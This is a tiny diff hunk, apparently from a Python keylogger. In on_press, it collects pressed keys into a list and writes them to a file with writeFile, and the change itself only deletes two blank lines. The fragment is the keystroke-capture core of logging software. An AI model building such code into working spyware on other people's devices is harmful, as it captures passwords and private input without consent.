@@ -14,8 +14,6 @@ def on_press(key):
 
     keys.append(key)
     count +=1
-
-
     writeFile(keys)
     keys = []
     count = 0
